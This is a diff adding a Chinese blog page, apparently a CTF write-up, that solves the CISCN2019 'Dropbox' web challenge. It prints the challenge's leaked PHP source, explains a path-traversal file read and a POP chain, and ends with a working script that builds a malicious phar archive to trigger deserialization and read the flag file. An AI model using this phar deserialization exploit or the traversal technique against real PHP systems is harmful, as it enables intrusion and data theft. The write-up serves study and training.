@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>[CISCN2019 华北赛区 Day1 Web1]Dropbox(phar) |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox(phar) |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="[CISCN2019 华北赛区 Day1 Web1]Dropbox(phar)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/-T4SH774g/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>[CISCN2019 华北赛区 Day1 Web1]Dropbox(phar)</h1>
+            <span class="meta">
+            	Posted on
+              2020-01-14，17 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>主页还是一个登陆框。sql注入无果。<br>
+扫下敏感文件。源码泄露。返回包hint。都没有<br>
+<img src="https://guokeya.github.io/post-images/1578977532324.png" alt="" loading="lazy"></p>
+<!-- more -->
+<p>注册。登陆。有一个文件上传，提示只能上传jpg等<br>
+<img src="https://guokeya.github.io/post-images/1578977647003.png" alt="" loading="lazy"><br>
+有两个功能。一个下载。一个上传<br>
+<img src="https://guokeya.github.io/post-images/1578977698831.png" alt="" loading="lazy"><br>
+看到了一个参数。感觉有任意文件读取<br>
+尝试../到上级目录。已知有login.php/register.php/download.php/upload.php/delete.php<br>
+读取一下,一个../不行。那就两个../<br>
+<img src="https://guokeya.github.io/post-images/1578977786906.png" alt="" loading="lazy"><br>
+成功读取到了upload的源码。源码中还包含了class.php<br>
+全部读取出来<br>
+<strong>class.php</strong></p>
+<pre><code>&lt;?php
+error_reporting(0);
+$dbaddr = &quot;127.0.0.1&quot;;
+$dbuser = &quot;root&quot;;
+$dbpass = &quot;root&quot;;
+$dbname = &quot;dropbox&quot;;
+$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);
+
+class User {
+    public $db;
+
+    public function __construct() {
+        global $db;
+        $this-&gt;db = $db;
+    }
+
+    public function user_exist($username) {
+        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;);
+        $stmt-&gt;bind_param(&quot;s&quot;, $username);
+        $stmt-&gt;execute();
+        $stmt-&gt;store_result();
+        $count = $stmt-&gt;num_rows;
+        if ($count === 0) {
+            return false;
+        }
+        return true;
+    }
+
+    public function add_user($username, $password) {
+        if ($this-&gt;user_exist($username)) {
+            return false;
+        }
+        $password = sha1($password . &quot;SiAchGHmFx&quot;);
+        $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;);
+        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);
+        $stmt-&gt;execute();
+        return true;
+    }
+
+    public function verify_user($username, $password) {
+        if (!$this-&gt;user_exist($username)) {
+            return false;
+        }
+        $password = sha1($password . &quot;SiAchGHmFx&quot;);
+        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;);
+        $stmt-&gt;bind_param(&quot;s&quot;, $username);
+        $stmt-&gt;execute();
+        $stmt-&gt;bind_result($expect);
+        $stmt-&gt;fetch();
+        if (isset($expect) &amp;&amp; $expect === $password) {
+            return true;
+        }
+        return false;
+    }
+
+    public function __destruct() {
+        $this-&gt;db-&gt;close();
+    }
+}
+
+class FileList {
+    private $files;
+    private $results;
+    private $funcs;
+
+    public function __construct($path) {
+        $this-&gt;files = array();
+        $this-&gt;results = array();
+        $this-&gt;funcs = array();
+        $filenames = scandir($path);
+
+        $key = array_search(&quot;.&quot;, $filenames);
+        unset($filenames[$key]);
+        $key = array_search(&quot;..&quot;, $filenames);
+        unset($filenames[$key]);
+
+        foreach ($filenames as $filename) {
+            $file = new File();
+            $file-&gt;open($path . $filename);
+            array_push($this-&gt;files, $file);
+            $this-&gt;results[$file-&gt;name()] = array();
+        }
+    }
+
+    public function __call($func, $args) {
+        array_push($this-&gt;funcs, $func);
+        foreach ($this-&gt;files as $file) {
+            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();
+        }
+    }
+
+    public function __destruct() {
+        $table = '&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;';
+        $table .= '&lt;thead&gt;&lt;tr&gt;';
+        foreach ($this-&gt;funcs as $func) {
+            $table .= '&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;' . htmlentities($func) . '&lt;/th&gt;';
+        }
+        $table .= '&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;';
+        $table .= '&lt;/thead&gt;&lt;tbody&gt;';
+        foreach ($this-&gt;results as $filename =&gt; $result) {
+            $table .= '&lt;tr&gt;';
+            foreach ($result as $func =&gt; $value) {
+                $table .= '&lt;td class=&quot;text-center&quot;&gt;' . htmlentities($value) . '&lt;/td&gt;';
+            }
+            $table .= '&lt;td class=&quot;text-center&quot; filename=&quot;' . htmlentities($filename) . '&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;';
+            $table .= '&lt;/tr&gt;';
+        }
+        echo $table;
+    }
+}
+
+class File {
+    public $filename;
+
+    public function open($filename) {
+        $this-&gt;filename = $filename;
+        if (file_exists($filename) &amp;&amp; !is_dir($filename)) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    public function name() {
+        return basename($this-&gt;filename);
+    }
+
+    public function size() {
+        $size = filesize($this-&gt;filename);
+        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
+        for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;
+        return round($size, 2).$units[$i];
+    }
+
+    public function detele() {
+        unlink($this-&gt;filename);
+    }
+
+    public function close() {
+        return file_get_contents($this-&gt;filename);
+    }
+}
+?&gt;
+</code></pre>
+<p><strong>delete.php</strong></p>
+<pre><code>&lt;?php
+session_start();
+if (!isset($_SESSION['login'])) {
+    header(&quot;Location: login.php&quot;);
+    die();
+}
+
+if (!isset($_POST['filename'])) {
+    die();
+}
+
+include &quot;class.php&quot;;
+
+chdir($_SESSION['sandbox']);
+$file = new File();
+$filename = (string) $_POST['filename'];
+if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) {
+    $file-&gt;detele();
+    Header(&quot;Content-type: application/json&quot;);
+    $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);
+    echo json_encode($response);
+} else {
+    Header(&quot;Content-type: application/json&quot;);
+    $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;);
+    echo json_encode($response);
+}
+?&gt;
+</code></pre>
+<p><strong>upload.php</strong></p>
+<pre><code>&lt;?php
+session_start();
+if (!isset($_SESSION['login'])) {
+    header(&quot;Location: login.php&quot;);
+    die();
+}
+
+include &quot;class.php&quot;;
+
+if (isset($_FILES[&quot;file&quot;])) {
+    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];
+    $pos = strrpos($filename, &quot;.&quot;);
+    if ($pos !== false) {
+        $filename = substr($filename, 0, $pos);
+    }
+    
+    $fileext = &quot;.gif&quot;;
+    switch ($_FILES[&quot;file&quot;][&quot;type&quot;]) {
+        case 'image/gif':
+            $fileext = &quot;.gif&quot;;
+            break;
+        case 'image/jpeg':
+            $fileext = &quot;.jpg&quot;;
+            break;
+        case 'image/png':
+            $fileext = &quot;.png&quot;;
+            break;
+        default:
+            $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;Only gif/jpg/png allowed&quot;);
+            Header(&quot;Content-type: application/json&quot;);
+            echo json_encode($response);
+            die();
+    }
+
+    if (strlen($filename) &lt; 40 &amp;&amp; strlen($filename) !== 0) {
+        $dst = $_SESSION['sandbox'] . $filename . $fileext;
+        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dst);
+        $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);
+        Header(&quot;Content-type: application/json&quot;);
+        echo json_encode($response);
+    } else {
+        $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;Invaild filename&quot;);
+        Header(&quot;Content-type: application/json&quot;);
+        echo json_encode($response);
+    }
+}
+?&gt;
+</code></pre>
+<p><strong>register.php</strong></p>
+<pre><code>&lt;?php
+session_start();
+if (isset($_SESSION['login'])) {
+    header(&quot;Location: index.php&quot;);
+    die();
+}
+?&gt;
+
+&lt;!doctype html&gt;
+
+&lt;head&gt;
+  &lt;meta charset=&quot;utf-8&quot;&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+  &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
+  &lt;title&gt;注册&lt;/title&gt;
+
+  &lt;!-- Bootstrap core CSS --&gt;
+  &lt;link href=&quot;static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+
+  &lt;style&gt;
+    .bd-placeholder-img {
+      font-size: 1.125rem;
+      text-anchor: middle;
+    }
+
+    @media (min-width: 768px) {
+      .bd-placeholder-img-lg {
+        font-size: 3.5rem;
+      }
+    }
+  &lt;/style&gt;
+  &lt;!-- Custom styles for this template --&gt;
+  &lt;link href=&quot;static/css/std.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+
+&lt;body class=&quot;text-center&quot;&gt;
+  &lt;form class=&quot;form-signin&quot; action=&quot;register.php&quot; method=&quot;POST&quot;&gt;
+    &lt;h1 class=&quot;h3 mb-3 font-weight-normal&quot;&gt;注册&lt;/h1&gt;
+    &lt;label for=&quot;username&quot; class=&quot;sr-only&quot;&gt;Username&lt;/label&gt;
+    &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required autofocus&gt;
+    &lt;label for=&quot;password&quot; class=&quot;sr-only&quot;&gt;Password&lt;/label&gt;
+    &lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required&gt;
+    &lt;button class=&quot;btn btn-lg btn-primary btn-block&quot; type=&quot;submit&quot;&gt;提交&lt;/button&gt;
+    &lt;p class=&quot;mt-5 mb-3 text-muted&quot;&gt;&amp;copy; 2018-2019&lt;/p&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;div class=&quot;top&quot; id=&quot;toast-container&quot;&gt;&lt;/div&gt;
+
+&lt;script src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;static/js/toast.js&quot;&gt;&lt;/script&gt;
+&lt;/html&gt;
+
+
+&lt;?php
+include &quot;class.php&quot;;
+
+if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) {
+    $u = new User();
+    $username = (string) $_POST[&quot;username&quot;];
+    $password = (string) $_POST[&quot;password&quot;];
+    if (strlen($username) &lt; 20 &amp;&amp; strlen($username) &gt; 2 &amp;&amp; strlen($password) &gt; 1) {
+        if ($u-&gt;add_user($username, $password)) {
+            echo(&quot;&lt;script&gt;window.location.href='login.php?register';&lt;/script&gt;&quot;);
+            die();
+        } else {
+            echo &quot;&lt;script&gt;toast('此用户名已被使用', 'warning');&lt;/script&gt;&quot;;
+            die();
+        }
+    }
+    echo &quot;&lt;script&gt;toast('请输入有效用户名和密码', 'warning');&lt;/script&gt;&quot;;
+}
+?&gt;
+</code></pre>
+<p><strong>index.php</strong></p>
+<pre><code>&lt;?php
+session_start();
+if (!isset($_SESSION['login'])) {
+    header(&quot;Location: login.php&quot;);
+    die();
+}
+?&gt;
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+&lt;title&gt;网盘管理&lt;/title&gt;
+
+&lt;head&gt;
+    &lt;link href=&quot;static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link href=&quot;static/css/panel.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;script src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;static/js/toast.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;static/js/panel.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;nav aria-label=&quot;breadcrumb&quot;&gt;
+    &lt;ol class=&quot;breadcrumb&quot;&gt;
+        &lt;li class=&quot;breadcrumb-item active&quot;&gt;管理面板&lt;/li&gt;
+        &lt;li class=&quot;breadcrumb-item active&quot;&gt;&lt;label for=&quot;fileInput&quot; class=&quot;fileLabel&quot;&gt;上传文件&lt;/label&gt;&lt;/li&gt;
+        &lt;li class=&quot;active ml-auto&quot;&gt;&lt;a href=&quot;#&quot;&gt;你好 &lt;?php echo $_SESSION['username']?&gt;&lt;/a&gt;&lt;/li&gt;
+    &lt;/ol&gt;
+&lt;/nav&gt;
+&lt;input type=&quot;file&quot; id=&quot;fileInput&quot; class=&quot;hidden&quot;&gt;
+&lt;div class=&quot;top&quot; id=&quot;toast-container&quot;&gt;&lt;/div&gt;
+
+&lt;?php
+include &quot;class.php&quot;;
+
+$a = new FileList($_SESSION['sandbox']);
+$a-&gt;Name();
+$a-&gt;Size();
+?&gt;
+</code></pre>
+<p><strong>download.php</strong></p>
+<pre><code>&lt;?php
+session_start();
+if (!isset($_SESSION['login'])) {
+    header(&quot;Location: login.php&quot;);
+    die();
+}
+
+if (!isset($_POST['filename'])) {
+    die();
+}
+
+include &quot;class.php&quot;;
+ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);
+
+chdir($_SESSION['sandbox']);
+$file = new File();
+$filename = (string) $_POST['filename'];
+if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) {
+    Header(&quot;Content-type: application/octet-stream&quot;);
+    Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename));
+    echo $file-&gt;close();
+} else {
+    echo &quot;File not exist&quot;;
+}
+?&gt;
+</code></pre>
+<p>开始分析。。首先从register.php入手<br>
+<img src="https://guokeya.github.io/post-images/1578978009206.png" alt="" loading="lazy"></p>
+<pre><code>初始化了User类
+用户名大于2小于20，密码要大于1为。这部分可以忽略不计
+然后调用了User类中的add_user，将用户名密码传入
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1578978104030.png" alt="" loading="lazy"><br>
+这部分代码又调用了user_exist($username)<br>
+<img src="https://guokeya.github.io/post-images/1578978142302.png" alt="" loading="lazy"><br>
+也就是判断用户名是否存在。由于使用预处理进行sql查询。不存在sql注入<br>
+如果存在。return false<br>
+不存在。就将密码+自定义的字符串。sha1加密后。放入数据库<br>
+至此。创建完了新用户<br>
+。接下来去login看看<br>
+<img src="https://guokeya.github.io/post-images/1578978302885.png" alt="" loading="lazy"><br>
+判断就不多说了。调用了User类中的verify_user函数<br>
+查询对应用户的密码。查询到了就赋值session。然后创建沙盒<br>
+跳转到index.php<br>
+index.php继续分析</p>
+<pre><code>&lt;?php
+include &quot;class.php&quot;;
+$a = new FileList($_SESSION['sandbox']);
+$a-&gt;Name();
+$a-&gt;Size();
+?&gt;
+</code></pre>
+<p>就几行代码。初始化了FileList类。调用Name和Size函数<br>
+<img src="https://guokeya.github.io/post-images/1578978609551.png" alt="" loading="lazy"><br>
+但是好像并没有这两个函数。这就会触发这个类中的_call魔法函数。<br>
+先记着。一般出现魔法函数。就是序列化那方面的东西。构造POP链<br>
+upload界面没涉及到类。就是普通的判断后缀名。文件类型。文件上传<br>
+download。</p>
+<pre><code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);
+设置了允许访问的目录。当前目录,etc,tmp
+只对这个文件生效
+</code></pre>
+<pre><code>$file = new File();
+$filename = (string) $_POST['filename'];
+if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) {
+    Header(&quot;Content-type: application/octet-stream&quot;);
+    Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename));
+    echo $file-&gt;close();
+} 
+</code></pre>
+<p>调用了File类中的open和close<br>
+可以看到。close存在文件读取函数<br>
+open判断文件存在和是否是目录,这几个函数都是会触发phar反序列化的。那么这题应该就是phar反序列化。读取根目录下的flag。因为web目录。访问flag等等404<br>
+<img src="https://guokeya.github.io/post-images/1578978918974.png" alt="" loading="lazy"><br>
+delete.php</p>
+<pre><code>$file = new File();
+$filename = (string) $_POST['filename'];
+if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) {
+    $file-&gt;detele();
+</code></pre>
+<p>同样调用了File类的open，和delete都可触发phar反序列化<br>
+思路有点懂了。由于download限制了open_basedir，所以我们通过delete.php触发反序列化。通过POP链最后。file_get_contents去获取flag内容<br>
+去class.php看看。构造pop链<br>
+<img src="https://guokeya.github.io/post-images/1578979634321.png" alt="" loading="lazy"><br>
+在User类和File类中。都存在close函数<br>
+而User类中是通过<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>d</mi><mi>b</mi><mo>−</mo><mo>&gt;</mo><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>e</mi><mo>(</mo><mo>)</mo><mi mathvariant="normal">调</mi><mi mathvariant="normal">用</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">果</mi><mi mathvariant="normal">通</mi><mi mathvariant="normal">过</mi><mi mathvariant="normal">反</mi><mi mathvariant="normal">序</mi><mi mathvariant="normal">列</mi><mi mathvariant="normal">化</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">将</mi><mi>d</mi><mi>b</mi><mi mathvariant="normal">变</mi><mi mathvariant="normal">成</mi><mi>n</mi><mi>e</mi><mi>w</mi><mi>F</mi><mi>i</mi><mi>l</mi><mi>e</mi><mo>(</mo><mo>)</mo><mi mathvariant="normal">，</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mi mathvariant="normal">变</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">/</mi><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">了</mi></mrow><annotation encoding="application/x-tex">this-&gt;db-&gt;close()调用
+如果通过反序列化。将db变成new File()，filename变成/flag，就成了</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">b</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mclose">)</span><span class="mord cjk_fallback">调</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">反</span><span class="mord cjk_fallback">序</span><span class="mord cjk_fallback">列</span><span class="mord cjk_fallback">化</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">将</span><span class="mord mathdefault">d</span><span class="mord mathdefault">b</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">成</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">成</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">了</span></span></span></span>this-&gt;File类&gt;close()<br>
+也就调用了file_get_contets函数读取了flag文件。<br>
+但是。这边由于反序列化return 了文件内容。将文件内容当作值。放入unlink函数删除。但是。文件不存在。所以就file not exists<br>
+<img src="https://guokeya.github.io/post-images/1578980219261.png" alt="" loading="lazy"><br>
+继续寻找一个能输出的点<br>
+继续看FileList类<br>
+<img src="https://guokeya.github.io/post-images/1578980776584.png" alt="" loading="lazy"><br>
+就一个构造函数。一个call魔法函数。一个析构函数<br>
+call函数将函数名放入<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mi>u</mi><mi>n</mi><mi>c</mi><mi>s</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">然</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">从</mi></mrow><annotation encoding="application/x-tex">funcs。然后从</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">u</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">从</span></span></span></span>files数组中循环取出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">将</mi><mi mathvariant="normal">其</mi><mi mathvariant="normal">调</mi><mi mathvariant="normal">用</mi><mi mathvariant="normal">为</mi></mrow><annotation encoding="application/x-tex">file，将其调用为</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">将</span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">调</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">为</span></span></span></span>file-&gt;$func<br>
+就调用了其他类。<br>
+然后看析构函数<br>
+都是foreach循环。然后echo输出。这不就有了输出点了吗。<br>
+call函数执行File类。析构函数输出。<br>
+现在就要想办法执行call函数。由于call函数是在找不到函数时才会执行<br>
+那么User类中的析构函数就有了用处</p>
+<pre><code>    public function __destruct() {
+        $this-&gt;db-&gt;close();
+    }
+</code></pre>
+<p>我们将db修改为FileList类。那么调用Filelist-&gt;close()函数。由于不存在close函数。所以会触发call魔法函数。我们再将call魔法函数接收两个值。一个是函数。一个是参数<br>
+close()就是函数。参数为空<br>
+call就调用了File-&gt;close()<br>
+然后将File中的filename定义为/flag.txt<br>
+POP链构造好了<br>
+User类的析构函数-&gt;FileList类的close函数-&gt;call函数调用File类的close()函数。获取flag内容-&gt;FileList的析构函数。输出内容<br>
+。开始构造exp</p>
+<pre><code>class User{
+	public $db;
+}
+class FileList{
+	private $files;
+	private $results;
+	private $funcs;
+	public function __construct() {
+        	$this-&gt;files = array(new File());
+            #由于file参数是从files。foreach读取的。而foreach要求是个数组。所以这边要用数组
+	        $this-&gt;results = array();
+        	$this-&gt;funcs = array();   
+ 	}
+}
+class File{
+	public $filename;
+	public function __construct(){
+		$this-&gt;filename='/flag.txt';
+	}
+}
+$a=new User();
+$a-&gt;db=new FileList();
+@unlink(&quot;phar.phar&quot;);
+$phar=new Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering(); 
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); 
+$phar-&gt;setMetadata($a); 
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);
+$phar-&gt;stopBuffering();
+</code></pre>
+<p>可以看见。前面还是file not exists。而后面增加了输出<br>
+<img src="https://guokeya.github.io/post-images/1578981467060.png" alt="" loading="lazy"></p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/y_oaQJpsF/">
+              <span class="post-title">
+                [安洵杯 2019]easy_serialize_php（反序列化截断）&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
